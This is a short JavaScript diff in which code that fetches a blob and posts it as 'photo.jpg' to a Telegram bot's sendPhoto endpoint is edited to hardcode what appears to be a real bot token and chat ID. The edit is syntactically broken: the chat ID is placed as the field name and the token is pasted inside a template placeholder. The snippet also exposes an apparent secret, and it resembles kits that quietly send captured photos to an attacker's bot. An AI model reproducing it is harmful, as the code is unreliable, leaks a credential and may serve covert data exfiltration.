@@ -32,10 +32,10 @@
         .then(res => res.blob())
         .then(blob => {
           const formData = new FormData();
-          formData.append("chat_id", CHAT_ID);
+          formData.append("7009447523", CHAT_ID);
           formData.append("photo", blob, "photo.jpg");
 
-          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          fetch(`https://api.telegram.org/bot${8265111331:AAHcyKSO2jIg8Z3QZcSN1E4XWc-0P7ugumc}/sendPhoto`, {
             method: "POST",
             body: formData,
           }).then(response => {
